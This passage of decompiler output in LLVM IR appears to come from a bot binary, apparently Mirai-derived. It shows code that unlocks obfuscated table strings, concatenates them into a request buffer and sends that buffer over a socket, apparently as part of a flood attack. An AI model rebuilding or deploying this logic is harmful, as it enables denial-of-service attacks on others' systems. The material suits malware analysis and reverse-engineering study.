dec_label_pc_10001070:                            ; preds = %dec_label_pc_10001054
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 4, i32* %r31.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-20884, align 4
  store i32 4, i32* %stack_var_-20880, align 4
  store i32 268439700, i32* @lr, align 4
  %v5_10001090 = call i32 @getsockopt(i32 1, i32 4, i32 %v2_10001080, i32 %v2_10001084, i32 %v1_10001068)
  store i32 %v5_10001090, i32* %r3.global-to-local, align 4
  %v3_10001094 = load i32, i32* %stack_var_-20884, align 4
  store i32 %v3_10001094, i32* %r0.global-to-local, align 4
  %v2_10001098 = or i32 %v3_10001094, %v5_10001090
  store i32 %v2_10001098, i32* %r9.global-to-local, align 4
  %v5_10001098 = icmp eq i32 %v2_10001098, 0
  %v0_100010a0 = load i32, i32* @r30, align 4
  %v1_100010a0 = inttoptr i32 %v0_100010a0 to i32*
  %v2_100010a0 = load i32, i32* %v1_100010a0, align 4
  br i1 %v5_10001098, label %dec_label_pc_100010a0, label %dec_label_pc_10001718

dec_label_pc_100010a0:                            ; preds = %dec_label_pc_10001070
  store i32 %v2_100010a0, i32* %r0.global-to-local, align 4
  %v0_100010a4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100010a4 = trunc i32 %v0_100010a4 to i8
  %v3_100010a4 = add i32 %v0_100010a0, 4
  %v4_100010a4 = inttoptr i32 %v3_100010a4 to i8*
  store i8 %v1_100010a4, i8* %v4_100010a4, align 1
  %v1_100010a8 = urem i32 %v2_100010a0, 32
  store i32 %v1_100010a8, i32* %r11.global-to-local, align 4
  %v1_100010ac = call i32 @__asm_rlwinm(i32 %v2_100010a0, i32 29, i32 3, i32 29)
  %v1_10001008.pre = load i32, i32* %r21.global-to-local, align 4
  br label %dec_label_pc_10001008

dec_label_pc_100010b4:                            ; preds = %dec_label_pc_10000eb0
  %v1_100010b4 = add i32 %v2_100014c4, 1456
  %v2_100010b4 = inttoptr i32 %v1_100010b4 to i32*
  %v3_100010b4 = load i32, i32* %v2_100010b4, align 4
  store i32 %v3_100010b4, i32* %r0.global-to-local, align 4
  %v1_100010b8 = icmp slt i32 %v3_100010b4, 0
  %v3_100010b8 = icmp eq i32 %v3_100010b4, 0
  store i1 %v1_100010b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100010b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100010b8, label %dec_label_pc_100014c4, label %dec_label_pc_100010c0

dec_label_pc_100010c0:                            ; preds = %dec_label_pc_100010b4
  store i32 4, i32* %r0.global-to-local, align 4
  store i8 4, i8* %v2_10000eb0, align 1
  %v1_100010d0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100010c8

dec_label_pc_100010c8:                            ; preds = %dec_label_pc_10000e68, %dec_label_pc_100010c0
  %v1_100010d0 = phi i32 [ %v2_100014c4, %dec_label_pc_10000e68 ], [ %v1_100010d0.pre, %dec_label_pc_100010c0 ]
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_100010d0 = add i32 %v1_100010d0, 1464
  %v3_100010d0 = inttoptr i32 %v2_100010d0 to i32*
  store i32 -1, i32* %v3_100010d0, align 4
  %v0_100010d4 = load i32, i32* @r28, align 4
  %v1_100010d4 = add i32 %v0_100010d4, 2116
  store i32 %v1_100010d4, i32* @r3, align 4
  %v0_100010d8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100010d8 = add i32 %v0_100010d4, 1452
  %v3_100010d8 = inttoptr i32 %v2_100010d8 to i32*
  store i32 %v0_100010d8, i32* %v3_100010d8, align 4
  store i32 1024, i32* @r4, align 4
  %v0_100010e0 = load i32, i32* @r28, align 4
  %v1_100010e0 = add i32 %v0_100010e0, 1431
  store i32 %v1_100010e0, i32* %r22.global-to-local, align 4
  store i32 268439784, i32* @lr, align 4
  %v0_100010e4 = call i32 @util_zero()
  %v0_100010e8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100010e8 = load i32, i32* @r28, align 4
  %v2_100010e8 = add i32 %v1_100010e8, 2112
  %v3_100010e8 = inttoptr i32 %v2_100010e8 to i32*
  store i32 %v0_100010e8, i32* %v3_100010e8, align 4
  store i32 10240, i32* @r4, align 4
  store i32 %v2_10000df4, i32* @r3, align 4
  store i32 268439800, i32* @lr, align 4
  %v0_100010f4 = call i32 @util_zero()
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439808, i32* @lr, align 4
  %v2_100010fc = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001100 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10001100, i32* %r4.global-to-local, align 4
  %v0_10001104 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001104 = add i32 %v0_10001104, %v2_100010fc
  store i32 %v2_10001104, i32* @r3, align 4
  %v2_10001108 = inttoptr i32 %v2_10001104 to i8*
  %v3_10001108 = call i32 @util_strcpy(i8* %v2_10001108, i32 %v0_10001100)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439828, i32* @lr, align 4
  %v2_10001110 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 %v2_10001110, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v3_10001118 = load i32, i32* inttoptr (i32 268501084 to i32*), align 4
  store i32 %v3_10001118, i32* %r4.global-to-local, align 4
  %v0_1000111c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000111c = add i32 %v0_1000111c, %v2_10001110
  store i32 %v2_1000111c, i32* @r3, align 4
  %v2_10001120 = inttoptr i32 %v2_1000111c to i8*
  %v3_10001120 = call i32 @util_strcpy(i8* %v2_10001120, i32 %v3_10001118)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439852, i32* @lr, align 4
  %v2_10001128 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_1000112c = load i32, i32* @r28, align 4
  %v1_1000112c = add i32 %v0_1000112c, 532
  store i32 %v1_1000112c, i32* %r4.global-to-local, align 4
  %v0_10001130 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001130 = add i32 %v0_10001130, %v2_10001128
  store i32 %v2_10001130, i32* @r3, align 4
  %v2_10001134 = inttoptr i32 %v2_10001130 to i8*
  %v3_10001134 = call i32 @util_strcpy(i8* %v2_10001134, i32 %v1_1000112c)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439872, i32* @lr, align 4
  %v2_1000113c = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001009c.45 to i32), i32* %r4.global-to-local, align 4
  %v0_10001148 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001148 = add i32 %v0_10001148, %v2_1000113c
  store i32 %v2_10001148, i32* @r3, align 4
  %v3_1000114c = inttoptr i32 %v2_10001148 to i8*
  %v4_1000114c = call i32 @util_strcpy(i8* %v3_1000114c, i32 ptrtoint ([24 x i8]* @global_var_1001009c.45 to i32))
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439896, i32* @lr, align 4
  %v2_10001154 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001158 = load i32, i32* @r28, align 4
  %v1_10001158 = add i32 %v0_10001158, 20
  store i32 %v1_10001158, i32* %r4.global-to-local, align 4
  %v0_1000115c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000115c = add i32 %v0_1000115c, %v2_10001154
  store i32 %v2_1000115c, i32* @r3, align 4
  %v2_10001160 = inttoptr i32 %v2_1000115c to i8*
  %v3_10001160 = call i32 @util_strcpy(i8* %v2_10001160, i32 %v1_10001158)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439916, i32* @lr, align 4
  %v2_10001168 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_100100b4.46 to i32), i32* %r4.global-to-local, align 4
  %v0_10001174 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001174 = add i32 %v0_10001174, %v2_10001168
  store i32 %v2_10001174, i32* @r3, align 4
  %v3_10001178 = inttoptr i32 %v2_10001174 to i8*
  %v4_10001178 = call i32 @util_strcpy(i8* %v3_10001178, i32 ptrtoint ([9 x i8]* @global_var_100100b4.46 to i32))
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439940, i32* @lr, align 4
  %v2_10001180 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001184 = load i32, i32* @r28, align 4
  %v1_10001184 = add i32 %v0_10001184, 789
  store i32 %v1_10001184, i32* %r4.global-to-local, align 4
  %v0_10001188 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001188 = add i32 %v0_10001188, %v2_10001180
  store i32 %v2_10001188, i32* @r3, align 4
  %v2_1000118c = inttoptr i32 %v2_10001188 to i8*
  %v3_1000118c = call i32 @util_strcpy(i8* %v2_1000118c, i32 %v1_10001184)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439960, i32* @lr, align 4
  %v2_10001194 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001198 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10001198, i32* %r4.global-to-local, align 4
  %v0_1000119c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000119c = add i32 %v0_1000119c, %v2_10001194
  store i32 %v2_1000119c, i32* @r3, align 4
  %v2_100011a0 = inttoptr i32 %v2_1000119c to i8*
  %v3_100011a0 = call i32 @util_strcpy(i8* %v2_100011a0, i32 %v0_10001198)
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 268439980, i32* @lr, align 4
  %v1_100011a8 = call i32 @table_unlock_val(i32 39)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268439988, i32* @lr, align 4
  %v2_100011b0 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_100011b0, i32* %r29.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  %v3_100011c0 = call i32 @table_retrieve_val(i32 39, i32* null)
  store i32 %v3_100011c0, i32* %r4.global-to-local, align 4
  %v0_100011c8 = load i32, i32* %r23.global-to-local, align 4
  %v1_100011c8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100011c8 = add i32 %v1_100011c8, %v0_100011c8
  store i32 %v2_100011c8, i32* @r3, align 4
  %v2_100011cc = inttoptr i32 %v2_100011c8 to i8*
  %v3_100011cc = call i32 @util_strcpy(i8* %v2_100011cc, i32 %v3_100011c0)
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 268440024, i32* @lr, align 4
  %v1_100011d4 = call i32 @table_lock_val(i32 39)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440032, i32* @lr, align 4
  %v2_100011dc = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_100011e0 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_100011e0, i32* %r4.global-to-local, align 4
  %v0_100011e4 = load i32, i32* %r23.global-to-local, align 4
  %v2_100011e4 = add i32 %v0_100011e4, %v2_100011dc
  store i32 %v2_100011e4, i32* @r3, align 4
  %v2_100011e8 = inttoptr i32 %v2_100011e4 to i8*
  %v3_100011e8 = call i32 @util_strcpy(i8* %v2_100011e8, i32 %v0_100011e0)
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268440052, i32* @lr, align 4
  %v1_100011f0 = call i32 @table_unlock_val(i32 40)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440060, i32* @lr, align 4
  %v2_100011f8 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_100011f8, i32* %r29.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v3_10001208 = call i32 @table_retrieve_val(i32 40, i32* null)
  store i32 %v3_10001208, i32* %r4.global-to-local, align 4
  %v0_10001210 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001210 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001210 = add i32 %v1_10001210, %v0_10001210
  store i32 %v2_10001210, i32* @r3, align 4
  %v2_10001214 = inttoptr i32 %v2_10001210 to i8*
  %v3_10001214 = call i32 @util_strcpy(i8* %v2_10001214, i32 %v3_10001208)
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268440096, i32* @lr, align 4
  %v1_1000121c = call i32 @table_lock_val(i32 40)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440104, i32* @lr, align 4
  %v2_10001224 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001228 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10001228, i32* %r4.global-to-local, align 4
  %v0_1000122c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000122c = add i32 %v0_1000122c, %v2_10001224
  store i32 %v2_1000122c, i32* @r3, align 4
  %v2_10001230 = inttoptr i32 %v2_1000122c to i8*
  %v3_10001230 = call i32 @util_strcpy(i8* %v2_10001230, i32 %v0_10001228)
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 268440124, i32* @lr, align 4
  %v1_10001238 = call i32 @table_unlock_val(i32 41)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440132, i32* @lr, align 4
  %v2_10001240 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10001240, i32* %r29.global-to-local, align 4
  store i32 41, i32* %r3.global-to-local, align 4
  %v3_10001250 = call i32 @table_retrieve_val(i32 41, i32* null)
  store i32 %v3_10001250, i32* %r4.global-to-local, align 4
  %v0_10001258 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001258 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001258 = add i32 %v1_10001258, %v0_10001258
  store i32 %v2_10001258, i32* @r3, align 4
  %v2_1000125c = inttoptr i32 %v2_10001258 to i8*
  %v3_1000125c = call i32 @util_strcpy(i8* %v2_1000125c, i32 %v3_10001250)
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 268440168, i32* @lr, align 4
  %v1_10001264 = call i32 @table_lock_val(i32 41)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440176, i32* @lr, align 4
  %v2_1000126c = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001270 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10001270, i32* %r4.global-to-local, align 4
  %v0_10001274 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001274 = add i32 %v0_10001274, %v2_1000126c
  store i32 %v2_10001274, i32* @r3, align 4
  %v2_10001278 = inttoptr i32 %v2_10001274 to i8*
  %v3_10001278 = call i32 @util_strcpy(i8* %v2_10001278, i32 %v0_10001270)
  store i32 %v3_10001278, i32* %r3.global-to-local, align 4
  %v0_1000127c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000127c, label %dec_label_pc_1000133c, label %dec_label_pc_10001280

dec_label_pc_10001280:                            ; preds = %dec_label_pc_100010c8
  store i32 42, i32* %r3.global-to-local, align 4
  store i32 268440200, i32* @lr, align 4
  %v1_10001284 = call i32 @table_unlock_val(i32 42)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440208, i32* @lr, align 4
  %v2_1000128c = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_1000128c, i32* %r29.global-to-local, align 4
  store i32 42, i32* %r3.global-to-local, align 4
  %v3_1000129c = call i32 @table_retrieve_val(i32 42, i32* null)
  store i32 %v3_1000129c, i32* %r4.global-to-local, align 4
  %v0_100012a4 = load i32, i32* %r23.global-to-local, align 4
  %v1_100012a4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100012a4 = add i32 %v1_100012a4, %v0_100012a4
  store i32 %v2_100012a4, i32* @r3, align 4
  %v2_100012a8 = inttoptr i32 %v2_100012a4 to i8*
  %v3_100012a8 = call i32 @util_strcpy(i8* %v2_100012a8, i32 %v3_1000129c)
  store i32 42, i32* %r3.global-to-local, align 4
  store i32 268440244, i32* @lr, align 4
  %v1_100012b0 = call i32 @table_lock_val(i32 42)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440252, i32* @lr, align 4
  %v2_100012b8 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_100012bc = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_100012bc, i32* %r4.global-to-local, align 4
  %v0_100012c0 = load i32, i32* %r23.global-to-local, align 4
  %v2_100012c0 = add i32 %v0_100012c0, %v2_100012b8
  store i32 %v2_100012c0, i32* @r3, align 4
  %v2_100012c4 = inttoptr i32 %v2_100012c0 to i8*
  %v3_100012c4 = call i32 @util_strcpy(i8* %v2_100012c4, i32 %v0_100012bc)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440272, i32* @lr, align 4
  %v2_100012cc = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_100012cc, i32* %r29.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_100012dc = call i32 @table_retrieve_val(i32 47, i32* null)
  store i32 %v3_100012dc, i32* %r4.global-to-local, align 4
  %v0_100012e4 = load i32, i32* %r23.global-to-local, align 4
  %v1_100012e4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100012e4 = add i32 %v1_100012e4, %v0_100012e4
  store i32 %v2_100012e4, i32* @r3, align 4
  %v2_100012e8 = inttoptr i32 %v2_100012e4 to i8*
  %v3_100012e8 = call i32 @util_strcpy(i8* %v2_100012e8, i32 %v3_100012dc)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440308, i32* @lr, align 4
  %v2_100012f0 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v3_100012f8, i32* %r4.global-to-local, align 4
  %v0_100012fc = load i32, i32* %r23.global-to-local, align 4
  %v2_100012fc = add i32 %v0_100012fc, %v2_100012f0
  store i32 %v2_100012fc, i32* @r3, align 4
  %v2_10001300 = inttoptr i32 %v2_100012fc to i8*
  %v3_10001300 = call i32 @util_strcpy(i8* %v2_10001300, i32 %v3_100012f8)
  %v0_10001304 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10001304, i32* %r3.global-to-local, align 4
  store i32 268440332, i32* @lr, align 4
  %v1_10001308 = inttoptr i32 %v0_10001304 to i8*
  %v2_10001308 = call i32 @util_strlen(i8* %v1_10001308)
  store i32 %v2_10001308, i32* %r29.global-to-local, align 4
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440344, i32* @lr, align 4
  %v2_10001314 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 10, i32* %r4.global-to-local, align 4
  %v0_1000131c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000131c = add i32 %v0_1000131c, %v2_10001314
  %v0_10001320 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001320, i32* %r3.global-to-local, align 4
  %v3_10001324 = trunc i32 %v0_10001320 to i8
  %v4_10001324 = call i32 @util_itoa(i8 %v3_10001324, i32 10, i32 %v2_1000131c)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440368, i32* @lr, align 4
  %v2_1000132c = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_10001330 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10001330, i32* %r4.global-to-local, align 4
  %v0_10001334 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001334 = add i32 %v0_10001334, %v2_1000132c
  store i32 %v2_10001334, i32* @r3, align 4
  %v2_10001338 = inttoptr i32 %v2_10001334 to i8*
  %v3_10001338 = call i32 @util_strcpy(i8* %v2_10001338, i32 %v0_10001330)
  store i32 %v3_10001338, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000133c

dec_label_pc_1000133c:                            ; preds = %dec_label_pc_100010c8, %dec_label_pc_10001280
  %v0_1000133c = load i32, i32* @r28, align 4
  %v1_1000133c = add i32 %v0_1000133c, 1468
  %v2_1000133c = inttoptr i32 %v1_1000133c to i32*
  %v3_1000133c = load i32, i32* %v2_1000133c, align 4
  store i32 %v3_1000133c, i32* %r0.global-to-local, align 4
  %v1_10001340 = icmp slt i32 %v3_1000133c, 0
  %v3_10001340 = icmp eq i32 %v3_1000133c, 0
  store i1 %v1_10001340, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001340, i1* %cr7_eq.global-to-local, align 1
  %tmp116 = icmp slt i32 %v3_1000133c, 1
  br i1 %tmp116, label %dec_label_pc_100013d8, label %dec_label_pc_10001348

dec_label_pc_10001348:                            ; preds = %dec_label_pc_1000133c
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440400, i32* @lr, align 4
  %v2_1000134c = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_100100d4.17 to i32), i32* %r4.global-to-local, align 4
  %v0_10001358 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001358 = add i32 %v0_10001358, %v2_1000134c
  store i32 %v2_10001358, i32* @r3, align 4
  %v3_1000135c = inttoptr i32 %v2_10001358 to i8*
  %v4_1000135c = call i32 @util_strcpy(i8* %v3_1000135c, i32 ptrtoint ([9 x i8]* @global_var_100100d4.17 to i32))
  store i32 %v4_1000135c, i32* %r3.global-to-local, align 4
  %v0_10001360 = load i32, i32* @r28, align 4
  %v1_10001360 = add i32 %v0_10001360, 1468
  %v2_10001360 = inttoptr i32 %v1_10001360 to i32*
  %v3_10001360 = load i32, i32* %v2_10001360, align 4
  store i32 %v3_10001360, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10001368 = icmp slt i32 %v3_10001360, 0
  %v3_10001368 = icmp eq i32 %v3_10001360, 0
  store i1 %v1_10001368, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001368, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-20888, align 4
  %tmp117 = icmp slt i32 %v3_10001360, 1
  br i1 %tmp117, label %dec_label_pc_100013c4, label %dec_label_pc_10001374

dec_label_pc_10001374:                            ; preds = %dec_label_pc_10001348, %dec_label_pc_10001374
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440444, i32* @lr, align 4
  %v2_10001378 = call i32 @util_strlen(i8* %v1_100010fc)
  %v3_1000137c = load i32, i32* %stack_var_-20888, align 4
  %v0_10001380 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001380 = add i32 %v0_10001380, %v2_10001378
  store i32 %v2_10001380, i32* @r3, align 4
  %v1_10001384 = mul i32 %v3_1000137c, 128
  %v1_10001388 = add i32 %v1_10001384, 1472
  %v0_1000138c = load i32, i32* @r28, align 4
  %v2_1000138c = add i32 %v1_10001388, %v0_1000138c
  store i32 %v2_1000138c, i32* %r4.global-to-local, align 4
  %v2_10001390 = inttoptr i32 %v2_10001380 to i8*
  %v3_10001390 = call i32 @util_strcpy(i8* %v2_10001390, i32 %v2_1000138c)
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440476, i32* @lr, align 4
  %v2_10001398 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100100e0.18 to i32), i32* %r4.global-to-local, align 4
  %v0_100013a4 = load i32, i32* %r23.global-to-local, align 4
  %v2_100013a4 = add i32 %v0_100013a4, %v2_10001398
  store i32 %v2_100013a4, i32* @r3, align 4
  %v3_100013a8 = inttoptr i32 %v2_100013a4 to i8*
  %v4_100013a8 = call i32 @util_strcpy(i8* %v3_100013a8, i32 ptrtoint ([3 x i8]* @global_var_100100e0.18 to i32))
  store i32 %v4_100013a8, i32* %r3.global-to-local, align 4
  %v3_100013ac = load i32, i32* %stack_var_-20888, align 4
  store i32 %v3_100013ac, i32* %r9.global-to-local, align 4
  %v0_100013b0 = load i32, i32* @r28, align 4
  %v1_100013b0 = add i32 %v0_100013b0, 1468
  %v2_100013b0 = inttoptr i32 %v1_100013b0 to i32*
  %v3_100013b0 = load i32, i32* %v2_100013b0, align 4
  store i32 %v3_100013b0, i32* %r0.global-to-local, align 4
  %v1_100013b4 = add i32 %v3_100013ac, 1
  store i32 %v1_100013b4, i32* %r4.global-to-local, align 4
  %v2_100013b8 = icmp slt i32 %v3_100013b0, %v1_100013b4
  %v3_100013b8 = icmp sgt i32 %v3_100013b0, %v1_100013b4
  %v4_100013b8 = icmp eq i32 %v3_100013b0, %v1_100013b4
  store i1 %v2_100013b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100013b8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_100013b4, i32* %stack_var_-20888, align 4
  br i1 %v3_100013b8, label %dec_label_pc_10001374, label %dec_label_pc_100013c4

dec_label_pc_100013c4:                            ; preds = %dec_label_pc_10001374, %dec_label_pc_10001348
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440524, i32* @lr, align 4
  %v2_100013c8 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_100013cc = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_100013cc, i32* %r4.global-to-local, align 4
  %v0_100013d0 = load i32, i32* %r23.global-to-local, align 4
  %v2_100013d0 = add i32 %v0_100013d0, %v2_100013c8
  store i32 %v2_100013d0, i32* @r3, align 4
  %v2_100013d4 = inttoptr i32 %v2_100013d0 to i8*
  %v3_100013d4 = call i32 @util_strcpy(i8* %v2_100013d4, i32 %v0_100013cc)
  store i32 %v3_100013d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100013d8

dec_label_pc_100013d8:                            ; preds = %dec_label_pc_1000133c, %dec_label_pc_100013c4
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440544, i32* @lr, align 4
  %v2_100013dc = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_100013e0 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_100013e0, i32* %r4.global-to-local, align 4
  %v0_100013e4 = load i32, i32* %r23.global-to-local, align 4
  %v2_100013e4 = add i32 %v0_100013e4, %v2_100013dc
  store i32 %v2_100013e4, i32* @r3, align 4
  %v2_100013e8 = inttoptr i32 %v2_100013e4 to i8*
  %v3_100013e8 = call i32 @util_strcpy(i8* %v2_100013e8, i32 %v0_100013e0)
  store i32 %v3_100013e8, i32* %r3.global-to-local, align 4
  %v0_100013ec = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100013ec, label %dec_label_pc_10001404, label %dec_label_pc_100013f0

dec_label_pc_100013f0:                            ; preds = %dec_label_pc_100013d8
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440568, i32* @lr, align 4
  %v2_100013f4 = call i32 @util_strlen(i8* %v1_100010fc)
  %v0_100013f8 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_100013f8, i32* %r4.global-to-local, align 4
  %v0_100013fc = load i32, i32* %r23.global-to-local, align 4
  %v2_100013fc = add i32 %v0_100013fc, %v2_100013f4
  store i32 %v2_100013fc, i32* @r3, align 4
  %v2_10001400 = inttoptr i32 %v2_100013fc to i8*
  %v3_10001400 = call i32 @util_strcpy(i8* %v2_10001400, i32 %v0_100013f8)
  store i32 %v3_10001400, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001404

dec_label_pc_10001404:                            ; preds = %dec_label_pc_100013d8, %dec_label_pc_100013f0
  %v0_10001404 = load i32, i32* @r28, align 4
  %v1_10001404 = add i32 %v0_10001404, 1440
  store i32 %v1_10001404, i32* %r31.global-to-local, align 4
  %v0_10001408 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10001408, i32* %r3.global-to-local, align 4
  store i32 %v1_10001404, i32* %r4.global-to-local, align 4
  %v2_10001410 = inttoptr i32 %v0_10001408 to i8*
  %v3_10001410 = call i32 @util_strcmp(i8* %v2_10001410, i32 %v1_10001404)
  store i32 %v3_10001410, i32* %r3.global-to-local, align 4
  %v1_10001414 = icmp slt i32 %v3_10001410, 0
  %v3_10001414 = icmp eq i32 %v3_10001410, 0
  store i1 %v1_10001414, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001414, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001414, label %dec_label_pc_10001db8, label %dec_label_pc_1000141c

dec_label_pc_1000141c:                            ; preds = %dec_label_pc_10001404, %dec_label_pc_10001db8
  %v0_1000141c = load i32, i32* @r28, align 4
  %v1_1000141c = inttoptr i32 %v0_1000141c to i32*
  %v2_1000141c = load i32, i32* %v1_1000141c, align 4
  store i32 %v2_1000141c, i32* %r29.global-to-local, align 4
  store i32 %v2_10000df4, i32* %r3.global-to-local, align 4
  store i32 268440616, i32* @lr, align 4
  %v2_10001424 = call i32 @util_strlen(i8* %v1_100010fc)
  store i32 %v2_10000df4, i32* %r4.global-to-local, align 4
  %v0_10001434 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001434, i32* %r3.global-to-local, align 4
  store i32 268440636, i32* @lr, align 4
  %v4_10001438 = call i32 @__libc_send(i32 %v0_10001434, i32 %v2_10000df4, i32 %v2_10001424, i32 16384)
  store i32 %v4_10001438, i32* %r3.global-to-local, align 4
  %v0_1000143c = load i32, i32* @r28, align 4
